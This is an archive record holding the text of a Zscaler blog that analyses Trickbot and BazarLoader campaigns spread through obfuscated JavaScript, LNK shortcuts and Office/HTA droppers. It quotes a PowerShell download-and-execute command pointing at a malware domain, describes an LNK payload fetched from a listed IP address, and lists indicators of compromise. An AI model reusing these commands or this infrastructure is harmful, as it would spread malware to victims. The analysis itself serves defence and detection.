{
    "id": "2ba63414-6b2d-40b0-a674-5bc27b241303",
    "created_at": "2023-01-12T15:06:09.820353Z",
    "updated_at": "2025-03-27T02:16:26.28637Z",
    "deleted_at": null,
    "sha1_hash": "46ae9b11aeceb20576241ee6361d59098b69d632",
    "title": "2021-10-08 - New Trickbot and BazarLoader campaigns use multiple delivery vectorsi",
    "authors": "",
    "file_creation_date": "2022-05-27T23:18:54Z",
    "file_modification_date": "2022-05-27T23:18:54Z",
    "file_size": 2272945,
    "plain_text": "# New Trickbot and BazarLoader campaigns use multiple delivery vectors\n\n**[zscaler.com/blogs/security-research/new-trickbot-and-bazarloader-campaigns-use-multiple-delivery-vectors](https://www.zscaler.com/blogs/security-research/new-trickbot-and-bazarloader-campaigns-use-multiple-delivery-vectors)**\n\n[The Zscaler ThreatLabz research team monitors thousands of files daily tracking new and pervasive threats, including one of the most](https://www.zscaler.com/threatlabz/threat-map-dashboard)\nprominent banking trojans of the last five years: Trickbot. Trickbot has been active since 2016 and is linked to a large number of malicious\ncampaigns involving bitcoin mining and theft of banking information, personal identifying information (PII), and credentials. BazarLoader is a\nspinoff of this trojan, developed by the same authors. Both are particularly dangerous as they are easily modifiable and capable of delivering\nmulti-stage payloads, as well as taking over computers entirely.\n\nThreatLabz has discovered Trickbot operators using new approaches to delivering payloads in recent attack campaigns. The malware\nsamples we analyzed were well-crafted and highly obfuscated with sandbox-evading capabilities. In this blog post, we will show analysis of\nthe different delivery vectors used by Trickbot and BazarLoader.\n\n**Key Points:**\n\n1. Script and LNK files added evasion techniques to leverage Malware threats.\n\n2. Multilayer obfuscation is used to preclude analysis of JS and LNK files.\n\n3. An Office attachment drops an HTA file with snippets of HTML and javascript functions.\n\n4. Newly registered domains are used to deliver threats.\n\n**Trickbot is expanding its range of file types for malware delivery**\n\nIn previous campaigns, Trickbot payloads were generally dropped as malicious attachments to Microsoft Office files. In the last month, we’ve\nseen that malware has also used javascript files at a high volume, along with a range of other file formats, as shown in the following charts:\n\n_Fig1:Trickbot blocked in the Zscaler Cloud Sandbox_\n\n\n-----\n\n_Fig2:BazarLoader blocked in the Zscaler Cloud Sandbox_\n\nIn this blog, we’ll walk through the attack chain for multiple delivery vectors, including:\n\nTrickbot spreading through scripting files\nTrickbot spreading through LNK files\nBazarLoader spreading through Office attachments\n\n**Trickbot spreading through scripting files**\n\nTrickbot gains intrusion using spam emails bundled with malicious javascript attachments, such as the following:\n\n_Fig3:Spam email attachment_\n\nIn this case, the Javascript [5B606A5495A55F2BD8559778A620F21B] file has three layers of obfuscation that are mostly used to evade and\nbypass sandbox environments. Below is the snapshot of the first obfuscated layer:\n\n\n-----\n\n_g_ _st aye o ob uscat o_ _ja asc pt_\n\nIn addition to taking extreme effort to make javascript files highly obfuscated, the malware authors have also added large amounts of junk\ncode to the end to make debugging more difficult. The junk code is just random generated obfuscated strings that do not play any role with\nthe malicious code.\n\n_Fig5:Junk code to make analysis difficult_\n\nUsing the eval() function we have de-obfuscated the second layer in which malicious code is embedded with more junk code. After removing\nthis layer of junk code, the eval() function is used once again to retrieve the final layer of code. We can see that the Trickbot authors used the\n**setTimeout() method, which evaluates an expression after a 967 milliseconds to delay execution in the sandbox. This helps the malware**\nevade sandbox environments.\n\n_Fig6: Second layer of obfuscation in javascript_\n\nIn the above snapshot we are able to see the replace method implemented in the code where “\"hdBDJ\"and “tSJVh” strings are removed\nfrom the variables “YHPhEFtKjqbCmAZ” and “kVYJOrLSqvdAWnaGTX” respectively to get the final string.\n\n\n-----\n\n_Fig7:Final layer_\n\nThe malicious Javascript executes cmd.exe as a child process, then cmd.exe executes powershell.exe to download Trickbot as payload.\n\n**Flow of execution:**\n\n**_Wscript.exe ->cmd.exe->powershell.exe_**\n\nPowershell.exe embedded with base64 encoded command and after decoded following command is:\n\n**_IEX (New-Object Net.Webclient).downloadstring(https://jolantagraban{.}pl/log/57843441668980/dll/assistant{.}php\")_**\n\n_Fig8:Zscaler Cloud Sandbox detection of Javascript Downloader_\n\n**Trickbot spreading through LNK files**\n\nWindows LNK (LNK) extensions are usually seen by users as shortcuts, and we have frequently observed cybercriminals using LNK files to\ndownload malicious files such as Trickbot. Trickbot hides the code in the argument section under the properties section of the LNK file. The\nmalware author added extra spaces in between the malicious code to attempt to make it more difficult for researchers to debug the code.\n[We’ve seen this technique used previously in the Emotet campaign using malicious Office attachments in 2018.](https://www.zscaler.com/blogs/security-research/independence-day-greeting-campaign-delivers-emotet-5)\n\n_Fig9:Code embedded in the properties section of LNK_\n\n\n-----\n\n**Downloading Trickbot :**\n\n1. LNK downloads the file from 45.148.121.227/images/readytunes.png using a silent argument so that the user is not able to see any\n\nerror message or progress action.\n2. After downloading, the malware saves the file to the Temp folder with the name application1_form.pdf.\n3. Finally, the file is renamed from application1_form.pdf to support.exe and executed. Here, support.exe is Trickbot.\n\n_Fig10:Zscaler Cloud Sandbox detection of LNK Downloader_\n\n**BazarLoader spreading through Office attachments**\n\nThis is one of the other techniques used in [TA551 APT aka Shathak. Malicious office documents drop the HTA file to](https://malware.news/t/continuously-changing-malicious-word-macro-being-distributed-trend-of-ta551-2/53142)\n**“C\\ProgramData\\sda.HTA”. This HTA file contains HTML and vbscript designed to retrieve a malicious DLL to infect a vulnerable Windows**\nhost with BazarLoader.\n\nOnce macro-enabled, the mshta.exe process executes to download a payload. This campaign has been observed delivering BazarLoader\nand Trickbot in the past.\n\n\n-----\n\n_g_ _ttac c a_ _o_ _OC_ _e to do_ _oad_ _a a_ _oade_\n\nBase64 encoded data is implemented in the HTML <div> tag which is used later with javascript.\n\n_Fig12:Dropped HTA file : Malicious base64 encoded under HTML <div> section_\n\nBelow is the snapshot of decode base64 data in which we can see it downloading the payload and saving as friendIFriend,jpg to the victim\nmachine:\n\n_Fig13:Dropped HTA file : Decode Base64 data_\n\n**Networking : C&C to download BazarLoader**\n\n_Fig14:Sending request to download BazarLoader_\n\nWe have also observed newly registered domains (NRDs) specifically created to distribute these payloads, using a stealer delivered through\nspam email and bundled with a malicious Microsoft Office attachment.\n\n\n-----\n\n_Fig15: Newly registered domain_\n\n_Fig16:Zscaler Cloud Sandbox detection of Malicious Office file Downloader_\n\n[JS.Downloader.Trickbot](https://threatlibrary.zscaler.com/threats/37daac40-4651-4cd0-9947-b77713c75859)\n\n[Win32.Backdoor.BazarLoader](https://threatlibrary.zscaler.com/threats/848ca346-b69f-468b-8bad-a12823237d4a)\n\n[VBA.Downloader.BazarLoader](https://threatlibrary.zscaler.com/threats/81efe542-3de5-4efe-8362-12b368661598)\n\n**MITRE ATT&CK**\n\nT5190 Gather Victim Network Information\n\nT1189 Drive-by Compromise\n\nT1082 System Information Discovery\n\nT1140 Deobfuscate/Decode Files or Information\n\nT1564 Hide Artifacts\n\nT1027 Obfuscated Files or Information\n\n**Indicators of Compromise**\n\n**Md5** **Filename** **FileType**\n\nB79AA1E30CD460B573114793CABDAFEB 100.js JS\n\nAB0BC0DDAB99FD245C8808D2984541FB 4821.js JS\n\n192D054C18EB592E85EBF6DE4334FA4D 4014.js JS\n\n21064644ED167754CF3B0C853C056F54 7776.js JS\n\n3B71E166590CD12D6254F7F8BB497F5A 7770.js JS\n\n\n-----\n\n5B606A5495A55F2BD8559778A620F21B 68.js JS\n\nBA89D7FC5C4A30868EA060D526DBCF56 Subcontractor Reviews (Sep 2021).lnk LNK\n\n**Md5** **Filename** **Filety**\n\nC7298C4B0AF3279942B2FF630999E746 a087650f65f087341d07ea07aa89531624ad8c1671bc17751d3986e503bfb76.bin.sample.gz DOC\n\n3F06A786F1D4EA3402A3A23E61279931 - DOC\n\n**Associated URLs:**\n\njolantagraban.pl/log/57843441668980/dll/assistant.php\n\nblomsterhuset-villaflora.dk/assistant.php\n\nd15k2d11r6t6rl.cloudfront.net/public/users/beefree\n\n**C&C:**\n\nDomain Payload\n\njolantagraban.pl Trickbot\n\nglareestradad.com BazarLoader\n\nfrancopublicg.com BazarLoader\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-10-08 - New Trickbot and BazarLoader campaigns use multiple delivery vectorsi.pdf"
    ],
    "report_names": [
        "2021-10-08 - New Trickbot and BazarLoader campaigns use multiple delivery vectorsi.pdf"
    ],
    "threat_actors": [
        {
            "id": "26a04131-2b8c-4e5d-8f38-5c58b86f5e7f",
            "created_at": "2022-10-25T15:50:23.579601Z",
            "updated_at": "2025-03-27T02:00:55.50292Z",
            "deleted_at": null,
            "main_name": "TA551",
            "aliases": [
                "TA551",
                "GOLD CABIN",
                "Shathak"
            ],
            "source_name": "MITRE:TA551",
            "tools": [
                "QakBot",
                "IcedID",
                "Valak",
                "Ursnif"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "04e34cab-3ee4-4f06-a6f6-5cdd7eccfd68",
            "created_at": "2022-10-25T16:07:24.578896Z",
            "updated_at": "2025-03-27T02:02:10.286803Z",
            "deleted_at": null,
            "main_name": "TA551",
            "aliases": [
                "Gold Cabin",
                "Monster Libra",
                "Shathak",
                "TA551"
            ],
            "source_name": "ETDA:TA551",
            "tools": [
                "BokBot",
                "CRM",
                "Gozi",
                "Gozi CRM",
                "IceID",
                "IcedID",
                "Papras",
                "Snifula",
                "Ursnif",
                "Valak",
                "Valek"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "90f216f2-4897-46fc-bb76-3acae9d112ca",
            "created_at": "2023-01-06T13:46:39.248936Z",
            "updated_at": "2025-03-27T02:00:03.031127Z",
            "deleted_at": null,
            "main_name": "GOLD CABIN",
            "aliases": [
                "Shakthak",
                "TA551",
                "ATK236",
                "G0127",
                "Monster Libra"
            ],
            "source_name": "MISPGALAXY:GOLD CABIN",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "40b623c7-b621-48db-b55b-dd4f6746fbc6",
            "created_at": "2024-06-19T02:03:08.017681Z",
            "updated_at": "2025-03-27T02:05:17.342829Z",
            "deleted_at": null,
            "main_name": "GOLD CABIN",
            "aliases": [
                "TA551 ",
                "Shathak"
            ],
            "source_name": "Secureworks:GOLD CABIN",
            "tools": [
                ""
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535969,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1653693534,
    "ts_modification_date": 1653693534,
    "files": {
        "pdf": "https://archive.orkl.eu/46ae9b11aeceb20576241ee6361d59098b69d632.pdf",
        "text": "https://archive.orkl.eu/46ae9b11aeceb20576241ee6361d59098b69d632.txt",
        "img": "https://archive.orkl.eu/46ae9b11aeceb20576241ee6361d59098b69d632.jpg"
    }
}